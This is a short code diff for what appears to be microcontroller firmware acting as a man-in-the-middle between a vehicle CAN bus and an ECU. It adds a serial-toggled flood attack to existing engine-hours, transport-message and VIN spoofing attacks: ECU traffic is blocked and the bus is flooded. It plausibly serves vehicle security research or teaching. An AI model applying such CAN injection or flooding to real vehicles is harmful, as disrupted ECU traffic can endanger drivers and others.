@@ -16,9 +16,12 @@ boolean AMBER_LED_state;
 boolean engine_hours_attack_state;
 boolean transport_message_attack_state;
 boolean vin_attack_state;
+boolean flood_attack_state;
 
 uint32_t vehicle_rx_count;
 uint32_t ecu_rx_count;
+
+CAN_message_t flood_msg;
 
 void setup() {
 
@@ -96,13 +99,15 @@ void rx_ecu_can(CAN_message_t &msg){
   }
   ecu_rx_count++;
   YELLOW_LED_state = !YELLOW_LED_state;
-  vehicle_can.write(msg);
+  if (!flood_attack_state) vehicle_can.write(msg);
 }
 
 void loop() {
   vehicle_can.events();
   ecu_can.events();
 
+  if (flood_attack_state) vehicle_can.write(flood_msg);
+  
   if (Serial.available()){
     char c = Serial.read();
     while(Serial.read() > 0); //flush the read buffer
@@ -110,11 +115,13 @@ void loop() {
     if      (c == 'h') engine_hours_attack_state = !engine_hours_attack_state;
     else if (c == 't') transport_message_attack_state = !transport_message_attack_state;
     else if (c == 'v') vin_attack_state = !vin_attack_state;
+    else if (c == 'f') flood_attack_state = !flood_attack_state;
     Serial.println(c);
   }
   RED_LED_state = (transport_message_attack_state ||
                    engine_hours_attack_state ||
-                   vin_attack_state);
+                   vin_attack_state || 
+                   flood_attack_state);
   
   digitalWrite(RED_LED,RED_LED_state);
   digitalWrite(GREEN_LED,GREEN_LED_state);
